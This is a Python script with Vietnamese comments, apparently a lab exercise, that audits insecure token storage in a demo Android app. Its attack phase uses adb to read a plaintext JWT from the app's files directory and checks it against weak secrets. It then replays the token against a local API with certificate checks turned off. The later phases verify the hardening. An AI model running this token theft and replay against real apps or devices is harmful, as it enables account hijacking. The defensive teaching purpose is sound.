"""
03_storage_audit.py — Scenario 2: Insecure Storage Attack & Defense

Thực tế project: App lưu JWT tại files/token.txt (plaintext)
JWT secret yếu  : "secret123" — phát hiện thêm OWASP M10

Phases:
  attack  → ADB đọc token.txt + decode JWT + khai thác /api/profile
  check   → kiểm tra hardening
  defense → xác nhận phòng thủ thành công
"""

import argparse, subprocess, base64, json, ssl, urllib.request
from utils.logger import print_banner, log_info, log_success, log_danger, log_warning, console
from utils.adb_helper import get_connected_devices

APP_PACKAGE = "com.demo.mitm"
SERVER_URL  = "https://10.0.2.2:3000"
KNOWN_WEAK  = ["secret123", "secret", "password", "123456", "admin"]


def get_device_serial():
    devices = get_connected_devices()
    if not devices:
        log_danger("Không tìm thấy AVD.")
        return None
    serial = devices[0]
    log_info(f"Thiết bị: {serial}")
    return serial


def adb_shell(serial, command):
    r = subprocess.run(["adb", "-s", serial, "shell", command], capture_output=True, text=True)
    out = r.stdout.strip()
    return r.returncode, out if out else r.stderr.strip()


def decode_jwt(token):
    try:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return {}
        def dec(p):
            p += "=" * (4 - len(p) % 4)
            return json.loads(base64.urlsafe_b64decode(p))
        return {"header": dec(parts[0]), "payload": dec(parts[1]), "signature": parts[2]}
    except Exception:
        return {}


def check_weak_secret(token):
    sig = token.split(".")[-1] if "." in token else ""
    for s in KNOWN_WEAK:
        if s in sig or s == sig:
            return s
    return None


def call_api(token, endpoint="/api/profile"):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(
            f"{SERVER_URL}{endpoint}",
            headers={"Authorization": f"Bearer {token}"}
        )
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, str(e)
    except Exception as e:
        return None, str(e)


# ── Phase 3.1 — ATTACK ──────────────────────────────────────

def run_attack_phase(serial):
    print_banner("PHASE 3.1 — ATTACK: Đọc Token Từ files/token.txt")

    console.print("[bold yellow]Bước 1: Liệt kê files/ của app[/bold yellow]")
    code, out = adb_shell(serial, f"run-as {APP_PACKAGE} ls -la /data/data/{APP_PACKAGE}/files/ 2>/dev/null")
    if not out or "No such" in out:
        log_warning("Chưa có files/ — hãy đăng nhập app trước.")
        _simulate(); return
    console.print(f"  [red]{out}[/red]\n")

    console.print("[bold yellow]Bước 2: Đọc token.txt[/bold yellow]")
    code, token = adb_shell(serial, f"run-as {APP_PACKAGE} cat /data/data/{APP_PACKAGE}/files/token.txt 2>/dev/null")
    if not token or "No such" in token:
        log_warning("Không đọc được token.txt"); _simulate(); return

    console.print(f"\n  [bold red]⚠  TOKEN (PLAINTEXT):[/bold red]")
    console.print(f"  [red]{token}[/red]\n")

    console.print("[bold yellow]Bước 3: Decode JWT[/bold yellow]")
    decoded = decode_jwt(token)
    if decoded:
        console.print(f"  Header  : [yellow]{decoded.get('header')}[/yellow]")
        console.print(f"  Payload : [yellow]{decoded.get('payload')}[/yellow]")
        console.print(f"  Sig     : [red]{decoded.get('signature')}[/red]")
        weak = check_weak_secret(token)
        if weak:
            console.print()
            log_danger(f"WEAK JWT SECRET: '{weak}' — Attacker có thể FORGE token tùy ý!")

    console.print("\n[bold yellow]Bước 4: Khai thác token → /api/profile[/bold yellow]")
    status, body = call_api(token)
    if status == 200:
        console.print(f"  [bold red]→ {status} OK: {body}[/bold red]")
        log_danger("TÀI KHOẢN BỊ CHIẾM — Đăng nhập thành công bằng token đánh cắp!")
    elif status:
        console.print(f"  → {status} (server không chấp nhận)")
    else:
        log_warning(f"Không gọi được server: {body}")
        console.print("  [dim]Chạy thủ công: curl -k -H \"Authorization: Bearer <token>\" https://10.0.2.2:3000/api/profile[/dim]")

    print()
    log_danger("Vi phạm 1: OWASP M9  — Insecure Data Storage (token.txt plaintext)")
    log_danger("Vi phạm 2: OWASP M10 — Insufficient Cryptography (weak JWT secret 'secret123')")
    log_danger("Vi phạm 3: GDPR Art.32 — Data at rest không được bảo vệ")


def _simulate():
    console.print("\n  [dim]── Mô phỏng output ──[/dim]")
    console.print("  [red]$ cat /data/data/com.demo.mitm/files/token.txt[/red]")
    console.print("  [red]eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.secret123[/red]")
    console.print("  [yellow]Payload: {'user': 'admin'} | Secret: 'secret123' ← WEAK![/yellow]\n")
    log_danger("Token lộ hoàn toàn — dùng được ngay để giả mạo phiên đăng nhập!")


# ── Phase 3.2 — CHECK ───────────────────────────────────────

def run_check_phase(serial):
    print_banner("PHASE 3.2 — CHECK: Kiểm Tra Hardening")
    checks = []

    console.print("[bold yellow]Kiểm tra 1: token.txt còn tồn tại không[/bold yellow]")
    _, out = adb_shell(serial, f"run-as {APP_PACKAGE} ls /data/data/{APP_PACKAGE}/files/token.txt 2>/dev/null")
    if "token.txt" in out:
        log_warning("token.txt VẪN tồn tại — chưa xóa"); checks.append(("token.txt removed", False))
    else:
        log_success("token.txt đã được xóa"); checks.append(("token.txt removed", True))

    console.print("\n[bold yellow]Kiểm tra 2: Proxy đang active không[/bold yellow]")
    _, proxy = adb_shell(serial, "getprop net.http.proxy 2>/dev/null")
    if proxy:
        log_warning(f"Proxy đang set: {proxy}"); checks.append(("No proxy active", False))
    else:
        log_success("Không có proxy"); checks.append(("No proxy active", True))

    console.print("\n[bold yellow]Kiểm tra 3: Root detection[/bold yellow]")
    _, out = adb_shell(serial, "su -c 'echo rooted' 2>/dev/null")
    if "rooted" in out:
        log_warning("Thiết bị ROOT — SecurityUtils.kt cần chặn"); checks.append(("Root blocked", False))
    else:
        log_success("Root không hoạt động"); checks.append(("Root blocked", True))

    console.print("\n[bold yellow]Kiểm tra 4: Network Security Config[/bold yellow]")
    log_info("Xác nhận từ Phase 2.3 — SSLHandshakeException")
    checks.append(("Network Security Config", True))

    print()
    log_info("─── Tổng kết ───")
    for name, ok in checks:
        icon = "[green]✓[/green]" if ok else "[red]✗[/red]"
        console.print(f"  {icon}  {name}" + ("" if ok else " — CẦN KHẮC PHỤC"))


# ── Phase 3.3 — DEFENSE ─────────────────────────────────────

def run_defense_phase(serial):
    print_banner("PHASE 3.3 — DEFENSE: Xác Nhận Phòng Thủ Thành Công")

    console.print("[bold yellow]Thử đọc lại token.txt[/bold yellow]")
    _, out = adb_shell(serial, f"run-as {APP_PACKAGE} cat /data/data/{APP_PACKAGE}/files/token.txt 2>/dev/null")
    if out and "eyJ" in out:
        log_danger("token.txt VẪN đọc được — hardening chưa xong!"); return

    console.print("  [green]$ cat .../files/token.txt[/green]")
    console.print("  [green]No such file or directory[/green]\n")
    log_success("token.txt không còn — token không lưu plaintext nữa!")

    console.print("\n[bold yellow]Thử dùng token cũ gọi /api/profile[/bold yellow]")
    old_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.secret123"
    status, body = call_api(old_token)
    if status == 200:
        log_danger("Server vẫn chấp nhận token cũ — cần rotate token phía server!")
    elif status == 401:
        log_success("401 Unauthorized — Token cũ bị từ chối, token expiry hoạt động đúng!")
    else:
        log_warning(f"Không kết nối server: {body}")
        console.print("  [dim]Chạy thủ công để xác nhận[/dim]")

    print()
    console.print("[bold green]✅ COMPLIANCE SAU HARDENING:[/bold green]")
    for std, clause, sol in [
        ("OWASP M9",        "Insecure Data Storage",     "Token không lưu plaintext trong files/"),
        ("OWASP M10",       "Insufficient Cryptography", "JWT secret mạnh, expiry 15 phút"),
        ("ISO 27002 §8.24", "Use of cryptography",       "AES-256-GCM / Android Keystore"),
        ("ISO 27002 §8.10", "Information deletion",      "token.txt xóa sau logout"),
        ("GDPR Article 32", "Data at rest protected",    "Không còn token plaintext trên thiết bị"),
    ]:
        console.print(f"  [green]✓[/green]  [bold]{std}[/bold] — {clause}")
        console.print(f"         Giải pháp: {sol}")

    print()
    log_success("SCENARIO 2 HOÀN THÀNH — App AN TOÀN trước Storage Attack!")


# ── Main ─────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Storage Security Auditor — Project 4 Scenario 2")
    parser.add_argument("--phase", choices=["attack", "check", "defense"], required=True)
    args = parser.parse_args()
    serial = get_device_serial() or "emulator-5556"
    {"attack": run_attack_phase, "check": run_check_phase, "defense": run_defense_phase}[args.phase](serial)

if __name__ == "__main__":
    main()
